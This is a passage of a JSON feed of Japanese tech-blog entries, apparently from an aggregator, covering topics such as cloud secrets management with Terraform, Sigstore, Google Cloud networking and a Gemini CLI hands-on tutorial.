LT資料です\\rhttps://mercari.connpass.com/event/367075/","isoDate":"2025-10-14T04:00:00.000Z","dateMiliSeconds":1760414400000,"authorName":"bells17","authorId":"bells17"},{"title":"[Go]RateLimitingを適用するミドルウェアの実装","link":"https://zenn.dev/takehiro1111/articles/go_ratelimit","contentSnippet":"本記事の内容Go で IP ベースでレート制限をかける際の具体的な実装(ミドルウェアとして記載)以下は本記事では触れない。IP ベース以外の制限での実装RateLimit についての説明インフラ側だと WAF で IP ベースでのレート制限を行うこともありますが、今回の記事では考慮に入れてません。 機能要件同一 IP からのリクエスト回数を制限1分間に10回までと制限を行い、利用可能なトークンがない場合は429 Too Many Requests を返す。Token Bucket方式でバースト許容(一時的な急増OK)を採用しています。ミドルウ...","isoDate":"2025-10-13T07:33:46.000Z","dateMiliSeconds":1760340826000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Modern Monolithを作りましょう！ Inertia.jsの紹介とその先","link":"https://speakerdeck.com/aminevg/modern-monolithwozuo-rimasiyou-inertia-dot-jsnoshao-jie-tosonoxian","contentSnippet":"マイクロサービス流行の時代で、あえてモノリスを作りませんか？\\r\\rバックエンドとフロントエンドの連携を行う際は、辛い思いをした方が多いのではないでしょうか。\\rAPIの作成、認証の実装、フォーム送信など、様々なハードルがあります。\\rそういった問題を解決して、フルスタック開発を楽にするライブラリさえあれば...\\r実際にありますよ！\\r\\rこのLTでは、SPAのフロントエンドをバックエンド内で作れるInertia.jsをご紹介します。\\r基本的な使い方から、直近の新機能やInertia.jsの将来を解説します。\\rこのLTを通じて、「フルスタック開発が楽になった！」「フロントエンドのためのAPI設計はもうさらばだ！」と思ってもらえればと思います。","isoDate":"2025-10-11T04:00:00.000Z","dateMiliSeconds":1760155200000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"楽にあなたのクラウドを守ろう！ - CNAPP概要","link":"https://zenn.dev/r4ynode/articles/cloud-security-using-cnapp","contentSnippet":"要約複数のセキュリティツールを使うのって大変だよねCNAPPとは統合セキュリティプラットフォーム っていう概念だよタイトルの「楽に」の意味は、CNAPP導入で結果的に運用が楽になるよ、という意味だよCNAPPを実現するツールは色々あるよ はじめにクラウドネイティブアプリケーションのセキュリティ対策で以下のような課題を抱えていませんか？複数のセキュリティツールを個別に運用しているそれぞれが独立した警告を発し、全体像が見えない運用コストが膨大で重要な脅威を見逃すリスクがあるそんな課題を解決するのがCNAPP（Cloud Native Application ...","isoDate":"2025-10-10T23:00:05.000Z","dateMiliSeconds":1760137205000,"authorName":"Reito Koike","authorId":"reito"},{"title":"Gemini CLI から Cloud Run にデプロイした MCP サーバに接続するベストプラクティス","link":"https://zenn.dev/kimitsu/articles/gemini-cli-cloud-run-mcp","contentSnippet":"10 月 8 日に Gemini CLI v0.8.0 がリリースされ、その中で IAP で保護された Cloud Run にデプロイされた MCP サーバへの接続がサポートされました。[1]この新しい方法は、従来の Cloud Run プロキシを使う方法や OIDC ID トークンを使う方法のデメリットを解消しており、Gemini CLI から Cloud Run 上の MCP サーバに接続するベストプラクティスが確立されたと考えています。今回はこの IAP for Cloud Run とサービスアカウントなりすましを使った方法を紹介します。 従来の方法とそのデメリット従来の...","isoDate":"2025-10-09T08:31:51.000Z","dateMiliSeconds":1759998711000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Spec DrivenでAI駆動開発を加速させる - Spec Kit入門","link":"https://zenn.dev/r4ynode/articles/spec-driven-development-using-spec-kit","contentSnippet":"はじめにAIに対して工夫なしの指示だと開発に限界を感じることもあるでしょう。AIにしっかりとコンテキストを渡してあげないと、意図通りに動いてくれません。考えられる解決策としては、自前でコンテキストや指示を書いたインストラクションMarkdownファイルを与える方法があります。個人的にはインストラクションの方が手軽なのでよくやりますが、先日以下の記事でSpec Drivenという言葉を見かけました。https://github.blog/ai-and-ml/generative-ai/spec-driven-development-with-ai-get-started-with...","isoDate":"2025-10-03T23:00:05.000Z","dateMiliSeconds":1759532405000,"authorName":"Reito Koike","authorId":"reito"},{"title":"DevOps/MLOpsに学ぶエージェントの可観測性","link":"https://speakerdeck.com/yunosukey/mlopsnixue-buezientonoke-guan-ce-xing","contentSnippet":"","isoDate":"2025-10-03T04:00:00.000Z","dateMiliSeconds":1759464000000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"KubernetesのSigstore活用","link":"https://sreake.com/blog/utilize-kubernetes-sigstore/","contentSnippet":"本記事では、KubernetesにおけるSigstoreプロジェクトの活用方法を解説します。 Sigstoreの概要や導入事例、キーレス署名については、前回の記事[Cosignによる署名検証とSigstoreの全体像]を […]The post KubernetesのSigstore活用 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-01T00:50:40.000Z","dateMiliSeconds":1759279840000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Cosignによる署名検証とSigstoreの全体像","link":"https://sreake.com/blog/signature-verification-by-cosign-and-sigstore/","contentSnippet":"Sigstore Sigstore は、コンテナイメージ、バイナリ、SBOMなどのソフトウェアアーティファクトに対して、安全な署名と検証を実現するOSSプロジェクトです。これを使うことで、ソフトウェアサプライチェーンのセ […]The post Cosignによる署名検証とSigstoreの全体像 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-01T00:50:01.000Z","dateMiliSeconds":1759279801000,"authorName":"Sreake","authorId":"Sreake"},{"title":"バイブコーディングと継続的デプロイメント","link":"https://speakerdeck.com/nwiizo/baibukodeingutoji-sok-de-depuroimento","contentSnippet":"2025年9月30日（火）、「バイブコーディングもくもく会 #03」というイベントで登壇することになった。\\rhttps://aimokumoku.connpass.com/event/368935/\\r\\r正直に言うと、このイベントがどんな空気感なのか、まだ全然掴めていない。ゆるい感じなのか、ガチな感じなのか。笑いを取りに行くべきなのか、真面目にやるべきなのか。そういう「場の空気」みたいなものが事前に分からないのは、けっこう怖い。だから、とりあえず色々なパターンを想定して準備している。要するに、どんな状況になっても対応できるように、という保険をかけまくっているのだ。我ながら、慎重すぎるかもしれない。\\r\\rブログとGithubはこちら。\\rhttps://syu-m-5151.hatenablog.com/\\rhttps://github.com/nwiizo\\r\\r一応、置いておく。見られるのは恥ずかしいけど、見られないのも寂しい。そういう矛盾した感情を抱えながら、当日を迎えることになりそうだ。Marp の資料はこちらです。\\rhttps://github.com/nwiizo/3shake-marp-templates/blob/main/slides/2025/vibe-coding-continuous-deployment.md","isoDate":"2025-09-30T04:00:00.000Z","dateMiliSeconds":1759204800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"InstructorライブラリとClean Architectureで実現する型安全なAI統合パターン","link":"https://sreake.com/blog/typesafe-ai-integration-pattern-with-instructor-library-and-clean-architecture/","contentSnippet":"はじめに 近年、業務アプリケーションにAI機能を組み込む事例が急速に増えています。しかし、AIの出力は本質的に不確実性を含むため、従来のWebアプリケーション開発で重視されてきた型安全性や保守性を維持することが課題となっ […]The post InstructorライブラリとClean Architectureで実現する型安全なAI統合パターン first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-29T13:27:21.000Z","dateMiliSeconds":1759152441000,"authorName":"Sreake","authorId":"Sreake"},{"title":"構造化出力を安定してLLMにさせたいなら「instructor」はいかが？","link":"https://sreake.com/blog/make-llm-output-stable-by-instructor/","contentSnippet":"はじめに：LLMの出力制御の課題 「このAIアプリ、ユーザーにいくつか選択肢を提示して、選んでもらう機能が必要だな…」 生成AIを使ったアプリケーション開発では、LLMから構造化されたデータを安定して取得することが重要な […]The post 構造化出力を安定してLLMにさせたいなら「instructor」はいかが？ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-29T13:27:12.000Z","dateMiliSeconds":1759152432000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Platform Engineering Maturity Modelってなに？","link":"https://zenn.dev/r4ynode/articles/platform-engineering-maturity-model","contentSnippet":"はじめに先日、以下のイベントに参加しました。そこで「Platform Engineering Maturity Model」を知ったので、その概要をまとめ、実際にどのように活用するのかを考えてみます。https://www.cnia.io/pek2025/ そもそもPlatform Engineeringってなに？!賛否両論ありそうな議題なので鵜呑みにしないでください。本題に入る前に一度初心にかえります。私は「Platform Engineering」を曖昧に理解しています。DevOpsやSREなど、類似する概念の定義と重なる部分があり、境界が曖昧に感じるところがあ...","isoDate":"2025-09-28T23:00:01.000Z","dateMiliSeconds":1759100401000,"authorName":"Reito Koike","authorId":"reito"},{"title":"みんなの考えた最強のデータ基盤アーキテクチャ第５回オールスター大集合スペシャル！！ 参加ログ","link":"https://zenn.dev/nedoko_dok0dko/articles/589fc799f824c6","contentSnippet":"what9/24(水)に開催された「みんなの考えた最強のデータ基盤アーキテクチャ第５回〜オールスター大集合スペシャル！！」の参加ログです。https://datatech-jp.connpass.com/event/360596/今回が初参加&初現地という完全初見でドキドキの中いってきました。 イベント概要datatech-jpというデータエンジニアのコミュニティで集ったデータエンジニアが、それぞれ考える最強のデータ基盤アーキテクチャを紹介し合うというイベントです。過去に４回開催されており、５回目となる今回は過去登壇した方々が「今のデータ基盤」を語るというもので...","isoDate":"2025-09-27T07:29:56.000Z","dateMiliSeconds":1758958196000,"authorName":"seno","authorId":"seno"},{"title":"ディレクトリ構成 ~レイヤーベース編~","link":"https://sreake.com/blog/layer-based-directory-structure-good-practice/","contentSnippet":"はじめに アプリケーション開発において、ディレクトリ構成は保守性・拡張性・開発効率に直結する設計要素です。 本記事では、以下のような課題に悩む現場に向けて、「シンプルで直感的、責務ごとの分離が容易」であるレイヤーベース構 […]The post ディレクトリ構成 ~レイヤーベース編~ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-26T06:30:23.000Z","dateMiliSeconds":1758868223000,"authorName":"Sreake","authorId":"Sreake"},{"title":"GitHub Actions \xd7 AWS OIDC連携の仕組みと経緯を理解する","link":"https://speakerdeck.com/ota1022/github-actions-x-aws-oidclian-xi-noshi-zu-mitojing-wei-woli-jie-suru","contentSnippet":"3-shake SRE Tech Talk #13 オンサイトのLT登壇資料です。\\rhttps://3-shake.connpass.com/event/362683/","isoDate":"2025-09-25T04:00:00.000Z","dateMiliSeconds":1758772800000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"2025-09-25 SRETT #13 ConftestによるTerraformのPolicy as Codeを試してみる","link":"https://speakerdeck.com/masasuzu/2025-09-25-srett-number-13-conftestniyoruterraformnopolicy-as-codewoshi-sitemiru","contentSnippet":"[3-shake SRE Tech Talk #13 オンサイト - connpass](https://3-shake.connpass.com/event/362683/)\\rでLTした内容。\\r\\rConftestを軽く試してみた内容。もう少し深堀りして、再度発表したいところ。","isoDate":"2025-09-25T04:00:00.000Z","dateMiliSeconds":1758772800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Cloud Service Mesh 入門編-Google のマネージドサービスメッシュを理解する","link":"https://sreake.com/blog/cloud-service-mesh-getting-started/","contentSnippet":"自己紹介 千葉工業大学大学院 情報科学研究科 情報科学専攻 修士１年の井上 裕介と申します．大学では主にメタヒューリスティクスに関する最適化アルゴリズムの研究に従事しております．2023 年のサマーインターンから引き続き […]The post Cloud Service Mesh 入門編-Google のマネージドサービスメッシュを理解する first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-25T02:12:40.000Z","dateMiliSeconds":1758766360000,"authorName":"Sreake","authorId":"Sreake"},{"title":"CTFのためのKubernetes入門","link":"https://speakerdeck.com/kyohmizu/ctfnotamenokubernetesru-men","contentSnippet":"イベント登壇資料です。2025/09/23 魔女のお茶会 #8\\rhttps://witchskeyparty.connpass.com/event/363928/","isoDate":"2025-09-23T04:00:00.000Z","dateMiliSeconds":1758600000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"クラウド環境におけるシークレットの扱い","link":"https://blog.masasuzu.net/entry/2025/09/19/203626","contentSnippet":"この内容は、社内のエンジニア勉強会で話した内容です。 speakerdeck.comみなさん。プロダクション環境のシークレット情報をどう扱っていますか?クラウドネイティブなアプリケーション開発において、DBのパスワードや外部APIキーといったシークレットの管理は、セキュリティを確保する上で避けては通れない課題です。この記事では、アプリケーションとインフラそれぞれの視点から、クラウド環境におけるシークレット管理のアンチパターンとベストプラクティスを探っていきます。ここで言うシークレットとはDBのパスワードやAPIキーなどの秘匿すべき情報のことを指します。アプリケーション側の視点まずは、アプリケーションがどのようにシークレットを扱うべきかを見ていきましょう。管理のアンチパターン最初に管理方法のアンチパターンとしては以下のものがありますソースコードに直接記述設定ファイルに平文で記述環境変数に平文で記述(Dockerfileや.envファイルでgit管理するなど)base64エンコードして保存ソースコードに記述すれば、すべての環境で同じ値しか使えず柔軟性がありません。設定ファイルや環境変数に平文で記述し、それをGitで管理してしまうと、何かのミスでリポジトリが流出した際にシークレットも漏れてしまいます。また、隠しているつもりでBase64エンコードするのも同様に危険です。Base64は暗号化ではなく、誰でも簡単に元の文字列に戻せるため、平文で保存しているのと大差ありません。KMSによる暗号化の検討次に考えられるのが、暗号鍵を使った暗号化です。AWSのKMSやGoogle CloudのCloud KMSといった鍵管理サービスを利用する方法が考えられます。フローとしては以下のようになりますでしょうかアプリケーション起動時にKMSのから鍵を取得取得した鍵を利用して暗号化されたシークレットを復号平文のシークレット情報をアプリで利用する一見これで良さそうですが、復号処理をアプリケーションの責務にすると、コードが複雑になるだけでなく、KMSの復号権限をアプリケーション自体に付与する必要があり、管理の懸念点が増えてしまいます。クラウド側のシークレットストアの利用そこで推奨されるのが、クラウドが提供するシークレット管理の仕組みを利用することです。AWSAWS Secrets ManagerAWS Systems Manager Parameter Store(SecureString)Google CloudSecret Managerこれらのサービスは、ECS FargateやCloud Runなどのコンテナ実行環境と統合されています。コンテナの起動時に、これらのストアに保存されたシークレットを、自動的に環境変数やファイルとしてマウントしてくれるのです。これによりアプリケーション側では、シークレットがどこで管理されているかを意識することなく、従来通り環境変数やファイルから値を読み込むだけで済むようになり、責務をシンプルに保つことができます。インフラ側の視点さて、アプリケーションの課題は解決しました。次に、インフラ側で、そのシークレットストアをどう管理するかという課題に移りましょう。取れる手段としては主に以下ものが考えられます。手動でコンソールから設定シークレットの値を平文でIaC管理(tfvarsファイルをgit管理から外す)シークレットの値を暗号化してIaCで管理シークレットストアをIaCで管理、値は手動設定まず手動で管理ですが、これはこれでありだと思ってます。ただし、扱うシークレットの数が増えてきたときに作業が煩雑であったり、手作業がゆえに起こるリソースタグなどの付け間違いなどのミスが発生しうるので、規模が大きくなると現実的ではありません。2つ目ですが、シークレットの値だけあつかるtfvarsファイルをgitignoreしてあげることでレポジトリが漏れてもシークレットの値が漏れないことになります。が、うっかりシークレットの値を人為的なミスでコミットしうるので完全に安全とはいいにくいです。3つ目ですが、これはsops providerを利用するパターンです。これを使うことでKMSキーを利用して暗号/復号がterraformとシームレスに統合できます。一見これで良さそうですが、2点課題があります。KMSリソースを余計に管理なくてはならないStateには平文で保存される前者は必要経費としていいとして、後者は課題となります。Terraformにおいてはstateを見る権限がある人にはシークレットも見れてしまうという懸念があります。シークレットのリソースと値を分離するこの方法の利点は、IaCでシークレット リソースが存在することは管理しつつ、その実際の値はGitの管理下から完全に分離できる点です。初回適用後にコンソールから実際のシークレット値を設定すれば、それ以降 terraform apply を実行しても値がダミー値で上書きされることはありません。これにより、コードレビューなどで誤ってシークレットが漏洩するリスクを原理的に防ぐことができ、非常にバランスの取れた管理方法と言えます。以下サンプルコードです。resource \\"aws_ssm_parameter\\" \\"db_password\\" {  type     = \\"SecureString\\"  name     = \\"/test/db_password\\"  value    =  \\"Dummy\\"  lifecycle {    ignore_changes = [value]  }}まとめ現時点でのクラウドにおけるシークレット管理のベストプラクティスは、以下のようにまとめることができるでしょう。アプリケーションクラウドのシークレットストア(Secrets Managerなど)と実行環境(ECS, Cloud Runなど)の統合機能を使い、環境変数またはファイルとしてシークレットを読み込む。インフラ(IaC)クラウドのシークレットストアのリソース自体はTerraformで管理する。実際のシークレットの値は ignore_changes を活用して手動で設定し、Gitの管理から分離する。もちろん要件によって取りうる手段は変わるとは思います。他になにか良い方法をご存知でしたら教えて下さい。それでは良いシークレットライフを!関連ページblog.masasuzu.net","isoDate":"2025-09-19T11:36:26.000Z","dateMiliSeconds":1758281786000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2025-09-19 クラウドにおけるシークレット管理","link":"https://speakerdeck.com/masasuzu/2025-09-19-kuraudoniokerusikuretutoguan-li","contentSnippet":"スリーシェイク社内のエンジニア勉強会で発表した資料\\r\\rクラウドにおいてプロダクション環境でのシークレットの扱い方についてアプリケーションおよびインフラ側でどう管理していくのが望ましいかを詳解","isoDate":"2025-09-19T04:00:00.000Z","dateMiliSeconds":1758254400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2025-08-05 Google Cloud Next Tokyo 2025 Cloud RunとCloud SQLの接続方式と事例","link":"https://speakerdeck.com/masasuzu/2025-08-05-google-cloud-next-tokyo-2025-cloud-runtocloud-sqlnojie-sok-fang-shi-toshi-li","contentSnippet":"","isoDate":"2025-09-17T04:00:00.000Z","dateMiliSeconds":1758081600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"actでGithub ActionsのVibe Codingを加速させる","link":"https://speakerdeck.com/kojake_300/actdegithub-actionsnovibe-codingwojia-su-saseru","contentSnippet":"","isoDate":"2025-09-16T04:00:00.000Z","dateMiliSeconds":1757995200000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Sreakeの英語ブログをはじめました！","link":"https://sreake.com/news/enabling-en-blog/","contentSnippet":"こんにちは！ Sreake事業部のイリドリシ愛民 (@realaminevg) です。 2020年から継続してきたSreakeブログの運用経験を活かし、今月からSreakeの英語ブログ（Sreake English Bl […]The post Sreakeの英語ブログをはじめました！ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-16T01:00:00.000Z","dateMiliSeconds":1757984400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Webアプリケーションにオブザーバビリティを実装するRust入門ガイド","link":"https://speakerdeck.com/nwiizo/webapurikesiyonniobuzababiriteiwoshi-zhuang-sururustru-men-gaido","contentSnippet":"2025年9月10日（水）、「Rustの現場に学ぶ〜Webアプリの裏側からOS、人工衛星まで〜」というイベントで登壇させていただきます。\\r\\rhttps://findy.connpass.com/event/359456/\\r\\r他の登壇者の話が聞きたすぎるけど調整能力の圧倒的な不足で登壇したらすぐに帰らなければなりません。\\r\\r今回の発表内容のベースとなったのはこちらのブログです。\\r- 「RustのWebアプリケーションにオブザーバビリティを実装するインフラエンジニアのための入門ガイド」","isoDate":"2025-09-10T04:00:00.000Z","dateMiliSeconds":1757476800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Google Cloud で目指す クラウド二刀流エンジニア講座 第1回 でパネルディスカッションに出てきました。","link":"https://blog.masasuzu.net/entry/2025/09/10/005523","contentSnippet":"先日、2025年6月4日に開催された 「Google Cloud で目指すクラウド二刀流エンジニア講座」 の第1回にて、「スペシャリストが語る！Google Cloud のメリットを活かすネットワーク、セキュリティのあり方とは？」 と題したパネルディスカッションに登壇いたしました。イベントから少し時間が経ちましたが、当日の内容を振り返り、話したことや、時間の都合上話しきれなかった点などをまとめていきたいと思います。cloudonair.withgoogle.comページとセッションでの資料は以下のとおりです。Session 3 : スペシャリストが語る！Google Cloud のメリットを活かすネットワーク、セキュリティのあり方とは？Session 3 : スペシャリストが語る！Google Cloud のメリットを活かすネットワーク、セキュリティのあり方とは？(スライド)以下パネルディスカッションでお話しした内容と補足を記載します。Question 1 :現在のハイブリッドクラウド構成時のトレンドとお客様が気にされるポイント大規模なシステムではオンプレミスとクラウドを組み合わせたハイブリッド構成を、中規模以下のシステムではオンプレミスからクラウドへ完全に移行する、あるいは最初からクラウドで構築する「クラウドネイティブ」な構成が多い傾向にあります。可用性向上のために、同じサービスをマルチクラウドで構築するケースは少なく、まずは単一クラウド内でのマルチリージョン構成が検討されることが多い印象です。しかし、私が担当するサービスではマルチリージョンが必要なほどクリティカルなものはそれほど多くなく、多くは単一リージョン内のマルチAZ(ゾーン)構成を採用しています。冗長性が目的ではなく、特定の機能を使いたいので一部のサービス（例: 特にBigQuery、Vertex AI）のみをGoogle Cloudで利用するケースがあります。メインクラウドがどちらかに偏っており、Google Cloudを補完的に利用するケースが多いようです。また、可用性向上という目的とは別に、特定の機能（特にBigQueryやVertex AIなど）を利用するために、一部のサービスのみGoogle Cloudを補完的に利用する、というケースでマルチクラウドを使用してる例が多いです。お客様が特に重視されるポイントとしては、コスト、セキュリティ、そして可用性の担保が挙げられます。Question 2 :クラウドのネットワーク設計、セキュリティ実装において押さえておくべきポイント最適な設計や実装は、お客様の組織体制やチーム体制、そして運用するサービスの性質によって大きく変わります。そのため、まずはどのような運用体制を目指すのかを分析・定義し、それに合った構成を提案することが重要です。考慮すべき観点としては、以下のような点が挙げられます。フォルダやプロジェクトの構成可用性の取り方過剰な可用性を求めていないか、サービスの要件と合っているかセキュリティの要求ネットワーク構成そして何よりも、設計した構成が、実際のチームで「運用可能」であることが最も重要だと考えています。Question 3 :ネットワーク、セキュリティの課題とアプローチここでは、ネットワークの課題を解決した事例を一つご紹介します。Cloud Run、MemoryStore (Redis)、Cloud SQLで構成されたアプリケーションで、Cloud RunとCloud SQL間のネットワーク性能が上がらないという問題が発生しました。Cloud RunはVPCの外部にあるリソースのため、VPC内にあるCloud SQLと接続するにはServerless VPC Connectorを経由していました。調査の結果、性能が出ない原因は、このServerless VPC Connectorのインスタンス数を固定で設定していたことでした。一時的な対処として、Serverless VPC Connectorの最大インスタンス数とインスタンスタイプを引き上げました。このサービスはサーバーレスという名前ですが、実際にはインスタンス数やタイプを指定する必要があります。(ここで言うサーバレスは、サーバレスなリソースへのコネクタという意です)しかし、この対処法では課題が残ります。Serverless VPC Connectorは一度スケールアウトすると自動でスケールインしないため、ピーク時に合わせたインスタンス数のコストを常に払い続けることになってしまいます。そこで根本的な解決策として、Direct VPC Egressへの移行を実施しました。Direct VPC Egressは、パフォーマンスが高く、コストもネットワーク転送料金のみに抑えられるというメリットがあります。ただし、VPCに直接接続するため、使用するIPアドレス数が多くなる点には注意が必要です。この事例では、Cloud Runのデプロイ設定でコネクタを切り替えるだけだったため、移行は比較的スムーズでした。また、インフラがコード化(IaC)されていたため、何か問題があってもすぐに切り戻しができる状態だったことも成功の要因です。この経験から言えるのは、本番稼働しているネットワークの変更は容易ではないということです。そのため、初期設計は慎重に行う必要があります。とはいえ、サービスの成長に伴う構成変更は避けられません。将来の変更を見越して、変更しやすい設計を心がけ、変更を安全に試せる環境を準備しておくことが重要です。具体的には、インフラを可能な限りIaC化して変更や切り戻しを容易にすること、検証環境をすぐに構築できるよう準備しておくこと、そして何よりも 現在のチームメンバーで運用できる方法を選択すること が大切です。チームのスキルレベルや人数、体制を考慮した現実的なアプローチを常に考えていく必要があります。(この事例の話、若干ずれてて長くなってしまった感があります。反省)Question 4 :Google Cloud のネットワーク・セキュリティ領域でのおすすめのサービス・機能ここでは3つのサービスをあげさせてもらいました。IAP限定公開の Google アクセス共有VPCIAPアプリケーションにGoogle認証を簡単に追加できる非常に便利なサービスです。最近、ALBなしでCloud Runに直接設定できるようになりました(プレビュー機能)。ただし、ALBを利用する場合と異なり、Cloud ArmorによるWAF保護が適用できないため、ユースケースに応じた注意が必要です。限定公開の Google アクセス通常、Compute EngineなどのリソースからGoogle系のAPI（Cloud Storageなど）にアクセスするには、外部IPアドレスを持つか、Cloud NATなどを経由する必要がありました。しかし、サブネットでこの「限定公開のGoogleアクセス」を有効にすると、追加費用なしで、外部IPを持たないリソースから直接Google APIにアクセスできるようになります。AWSではVPC EndpointをAPIごとに作成する必要があり、管理が煩雑でコストもかかりますが、Google Cloudではこの機能によって非常にシンプルかつ低コストにプライベートなアクセスが実現できます。共有 VPC(Shared VPC)誰にでもおすすめできるわけではありませんが、特定の要件には非常に有効な機能です。共有VPCを利用すると、ネットワークとセキュリティの管理をインフラチームに集約し、各サービス開発チームは払い出されたサブネット上で開発に専念する、といった職掌の分離が可能になります。これにより、開発チームはインフラを意識することなくアプリケーション開発に集中できます。一つの大規模なシステムを複数のチームで開発する場合や、複数のプロジェクトでVPC上のリソースを共有したい場合に特に便利です。一方で、ネットワークの独立性が失われるため、ファイアウォールの設定をより厳密に行う必要があります。また、開発チームがネットワーク設定を直接変更できないため、変更の都度インフラチームへの依頼が必要になるというデメリットもあります。Question 5 :おすすめのクラウドのネットワーク、セキュリティのベストプラクティスのキャッチアップ方法セキュリティ分野に限りませんが、日々の情報収集が重要です。私のチームでは、Google CloudのリリースノートやAWSのアップデート情報を定期的に確認する会を社内で実施し、効率的に新しい情報をキャッチアップしています。また、資格試験の勉強や更新も、知識を体系的にアップデートする良い機会になります。コミュニティや勉強会イベントへの参加も非常に有効です。Google Cloud関連では、主に以下の2つのコミュニティが活発です。Jagu’e’r (Japan Google Cloud Usergroup for Enterprise)GCPUG(Google Cloud Platform User Group)Jagu\'e\'rは、ユーザー企業とパートナー企業の従業員で構成されるコミュニティで、各分科会での活動が活発です。私自身もクラウドネイティブ分科会の運営に携わっています。GCPUGは、特にShonan支部が活発に活動されている印象です。他の支部は活動が緩やかになっている面もありますが、Slackワークスペースは現在も動いており、各サービスのチャンネルでは最新アップデートに関する議論が行われています。まとめ今回、初めてパネルディスカッションという形式で登壇させていただきました。至らない点も多々ありましたが、大変貴重な経験となりました。技術に関する議論はやはり楽しいと感じました。今後もこのような機会があれば、ぜひ参加していきたいです。","isoDate":"2025-09-09T15:55:23.000Z","dateMiliSeconds":1757433323000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"あなたのアプリにマルチリージョンは必要ないかもしれない","link":"https://zenn.dev/kamos/articles/dont_need_multi_region","contentSnippet":"はじめにアプリケーションを運用する上で、可用性は避けて通れない重要なテーマです。可用性を確保するためにインフラの単一障害点を可能な限りなくし、冗長化構成を組むことは今や常識となっています。その中でも特に強力な障害対策として挙げられるのが「マルチリージョン構成」です。しかし、その実装と運用には相応のコストと複雑さが伴います。この記事では、クラウドインフラにおける障害対策としてのマルチリージョン化が、本当にあなたのアプリケーションに必要なのかを、コストとリスクの観点から考察します。 あなたのアプリに「高い可用性」は必要か？あらゆるサービスが高い可用性を目指すべきかというと、必...","isoDate":"2025-09-06T03:32:28.000Z","dateMiliSeconds":1757129548000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"Gemini CLI AI駆動開発体験ハンズオン","link":"https://shu-kob.hateblo.jp/entry/2025/09/05/185202","contentSnippet":"この記事は#17 Gemini CLI AI駆動開発体験ハンズオン【オンライン】 - connpassの資料です。Gemini CLI AI駆動開発体験ハンズオン\uD83C\uDFAF 本日のゴールこのハンズオンでは、Googleの強力なAIモデルであるGeminiをターミナルから対話的に利用できるGemini CLIを使い、以下の3つの体験を通じて、日々の開発タスクを劇的に効率化する「AI駆動開発」の第一歩を踏み出すことを目指します。面倒なドキュメント作成の自動化未知のアプリケーションの迅速な立ち上げ対話によるスマートな機能追加\uD83E\uDDE0 Gemini CLIとは？Gemini CLIは、Googleが公開したオープンソースのAIエージェントです。ターミナル（コマンドライン）から自然言語で指示を出すだけで、まるで優秀なアシスタントがいるかのように、以下のようなタスクをこなします。コードの生成・編集・解説ファイル操作情報検索ワークフローの自動化それでは、早速AIとのペアプログラミングの世界を体験してみましょう！1. 準備a. Node.js (npm) のインストールGemini CLIのインストールに必要です。未インストールの方はVer.20以上をインストールしてください。b. Gemini CLIのインストールと設定ターミナルを開き、以下のコマンドを実行します。# Gemini CLIをインストールnpm install -g @google/gemini-cli# インストールされたことを確認gemini --version以下のようにバージョン情報が表示されればOKです。0.3.2c. 認証設定Gemini-CLIのREADMEを参照github.comターミナルでgeminiと入力すると、対話モードとなります。/quitで退出できます。2. ハンズオン1: ローカルコードを解析してREADME.mdを自動生成まずは、既存のコードからプロジェクトの説明書であるREADME.mdを自動生成させてみましょう。手順1. 作業用ディレクトリの作成と移動mkdir gemini-cli-handson && cd gemini-cli-handson2. サンプルコードの作成簡単なWebサーバーのPythonコードを作成します。main.pyというファイル名で以下の内容を保存してください。touch main.pyimport http.serverimport socketserverPORT = 8000Handler = http.server.SimpleHTTPRequestHandlerwith socketserver.TCPServer((\\"\\", PORT), Handler) as httpd:    print(\\"serving at port\\", PORT)    httpd.serve_forever()main.pyを動かしてくださいなどと入力することで起動させることができます。3. ハンズオン1: GeminiにREADMEの作成を依頼！カレントディレクトリの情報をコンテキスト (-c ) として渡し、READMEの作成を依頼し、> を使ってファイルに保存します。\uD83D\uDCBB 実行するコマンド:gemini -p \\"このプロジェクトのREADME.mdを日本語で生成してください。プロジェクトの概要、使い方、実行方法を簡潔にまとめてください。\\" -c  > README.mdls コマンドで README.md ファイルが作成されていることを確認してください。たったこれだけで、プロジェクトのドキュメントが完成しました！4. ハンズオン2: 未知のアプリを動かしてみる次に、GitHubから使い方があまり書かれていないプロジェクトをCloneしてきて、Geminiに起動方法を尋ねて動かしてみましょう。手順サンプルリポジトリのクローンまずは一つ上の階層に戻り、サンプルリポジトリをクローンします。git clone https://github.com/shu-kob/rag-app-handsonREADMEがあるとGeminiがその内容をヒントにしてしまうため、READMEがなくてもどれだけ自力でアプリの構造を理解できるか試すためにREADME.mdを削除します。cd rag-app-handsonrm frontend/README.md backend/README.mdGeminiに起動方法を質問してみます。このディレクトリにはREADME.mdがありません。どうやって動かせばいいか、Geminiに聞いてみましょう。\uD83D\uDCBB 実行するコマンド:gemini -p \\"このプロジェクトの実行方法を教えて。必要な手順をステップバイステップで説明して。\\" -c Geminiは ファイルを見て、以下のような実行手順を説明してくれます。5. ハンズオン3: 